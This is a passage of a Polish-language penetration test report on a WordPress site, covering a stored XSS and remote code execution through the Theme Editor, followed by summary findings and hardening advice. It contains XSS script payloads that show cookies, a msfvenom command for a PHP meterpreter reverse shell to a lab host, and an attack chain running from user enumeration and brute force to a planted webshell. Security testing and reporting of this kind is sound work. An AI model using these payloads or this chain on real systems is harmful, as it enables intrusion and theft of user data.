**Stopień zagrożenia:** Niski - CVSS 2.4 (Wektor: `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:N/A:N`)

**Położenie:** Interfejs publikowania wpisów, np. `rpi.bot/wp-admin/post.php?post=39&action=edit`, a w szczególności okno zawartości.

**Opis:** Dostęp do użytkownika z dużymi uprawnieniami pozwala na dodawanie złośliwego kodu do wpisów.

**Koncepcja:** Wykorzystując zdobyte konto, dodano złośliwy wpis o treści:

```
This is some text.
<script>alert(document.cookie);</script>
<script>alert("XSS");</script>
Some more text.

```

Wpis ten w kodzie źródłowym pokazuje się jako `<p>&lt;script>alert(document.cookie);&lt;/script></p>`. Wskazuje to na fakt, że 
wystarczy zakodować odpowiednio znak `<`, aby atak się powiódł. Wypróbowano kilku rodzajów kodowania, ale strona za każdym razem poprawnie czyściła wprowadzone dane. Ostatecznie, atak powiódł się poprzez uruchomienie trybu edycji HTML wpisu, a następnie usunięcie tagów `<p>` wokół kodu.

![alt text](https://github.com/jkulawik/BOT-IoT/blob/master/xss-cookie.PNG)

W powyższym teście sprawdzone zostało również, czy wyświetli się zawartość ciasteczek. Ponieważ wyświetlają się one, oznacza to że możliwa jest kradzież danych użytkownika.

**Zalecenia:** Dodanie do strony nagłówków [X-XSS-protection](https://www.webarxsecurity.com/https-security-headers-wp/) oraz [http-only](https://geekflare.com/wordpress-x-frame-options-httponly-cookie/) do ciasteczek (co wymaga wcześniejszego zaimplementowania HTTPS).

## Zdalne wykonywanie kodu (edycja motywów)
**Stopień zagrożenia:** 5.5 - CVSS  (Wektor: `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:L/I:L/A:L`)

**Położenie:** Podatność może być umieszczona w dowolnym miejscu za pomocą interfejsu `Appearance/Theme Editor`.

**Opis:** Interfejs administratora pozwala na wgranie złośliwego kodu.

**Koncepcja:** Korzystając ze zdobytego konta administratora, uruchomiono panel `Appearance/Theme Editor`. Następnie, na wzorcu strony błędu 404 dodano kod PHP wygenerowany za pomocą narzędzia *msfvenom* z następującymi opcjami: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.132 LPORT=4444 R`.

Następnie uruchomiono nasłuchiwane za pomocą modułu metasploit `multi/hanlder` oraz uruchomiono stronę 404. Poskutkowało to uzyskaniem sesji meterpretera na użytkowniku bez uprawnień root. Ze wzgledu na ograniczone możliwości webshelli PHP, niektóre funkcje meterpretera nie działają, przez co nie da się podwyższyć uprawnień.

**Zalecenia:** Podatność ta jest znana przez organizację Wordpress. Zapobiec jej można jedynie usuwając tą funkcjonalność, jednak powszechnie zalecanym rozwiązaniem jest ostrożne rozdawanie uprawnień oraz korzystanie z silnych haseł na kontach z dostępem do omawianego interfejsu.

# Podsumowanie

Celem zbadania strony było sprawdzenie, w jakim stopniu we współczesnych rozwiązaniach występują szeroko znane podatności. 
Jak pokazuje raport, środowisko jest odporne na nieco bardziej skomplikowane podatności, ale równocześnie podatne na bardzo podstawowe i toporne ataki. 

W szczególności udało się przeprowadzić prosty atak o następującym przebiegu:

1. Enumeracja użytkowników
2. Brute force logowania na konto administratora
3. Umieszczenie webshella na łatwo dostępnej stronie
4. Wykorzystanie webshella do uzyskania dostępu do maszyny

Znaczna część ze znalezionych podatności wynika ze złej konfiguracji środowiska; niezadbanie o bezpieczeństwo podczas procesu instalacji prowadzi do podatności na proste ataki, które mogą doprowadzić do kompromitacji elementu. Fakt ten podkreśla wagę edukacji na ten temat; w szczególności dobre byłoby nakierowanie użytkownika przez poradnik instalcji na poradniki utwardzania danego środowiska.

Wykorzystywanie słabych haseł znacząco ułatwia ataki, a jak pokazują przykłady wspomnianych na początku botnetów, korzystanie z haseł domyślnych jest popularną praktyką. Istotną uwagą jest tutaj, że wiele ze znalezionych podatności wynika jedynie z dostępu do konta administratora; oznacza to, że odpowiednio silne hasła oraz odpowiedzialne zarządzanie pozwoleniami jest w tym wypadku najważniejszym zabezpieczeniem.

Wbudowany tester siły hasła jest dosyć dobrą wskazówką dla użytkownika. Poniżej przedstawiono przykład najprostszego "silnego" hasła przepuszczonego przez system:

![alt text](https://github.com/jkulawik/BOT-IoT/blob/master/shortest-strong-passwd.PNG)

Strona podczas rejestracji sprawdza, czy użytkownik wykorzystuje silne hasło. Leniwy użytkownik może jednak obejść ten system dla własnej wygody:

![alt text](https://github.com/jkulawik/BOT-IoT/blob/master/new-user.PNG)

Na powyższym obrazku należy również zwrócić uwagę na adres e-mail; wykorzystano tutaj e-mail tymczasowy, usługa która może być wykorzystywana do rejestrowania anonimowych, złośliwych kont. Na niektórych stronach (w szczególności społecznościowych) maile takie powinny być blokowane (zniechęcanie atakującego).

Strona posiada również panel, który pozwala na monitorowanie jej zdrowia. 

![alt text](https://github.com/jkulawik/BOT-IoT/blob/master/sitehealth.PNG)

Zwraca ona uwagę na brak HTTPS; nie zawiera ona jednak żadnych informacji o dwóch "krytycznych" dla tego serwisu zagrożeń, czyli enumeracji użytkowników oraz brute-force'owaniu haseł (już po dokonaniu tego ataku). 

## Wnioski

Pomimo automatyzacji wielu zabezpieczeń oraz ich wbudowania w podstawowe pakiety, współczesne strony nadal mogą posiadać podstawowe błędy w konfiguracji. Dlatego też administratorzy powinni aktywnie interesować się bezpieczeństwem lub korzystać z usług pentesterów :)

Projekt pokazał również, że najsłabszym ogniwem w bezpieczeństwie nadal (lub nawet bardziej niż kiedyś) jest człowiek. Mocne hasła są kluczowym elementem bezpieczeństwa; użytkownicy powinni być edukowani na ten temat - w szczególności ci z podwyższonymi uprawnieniami.
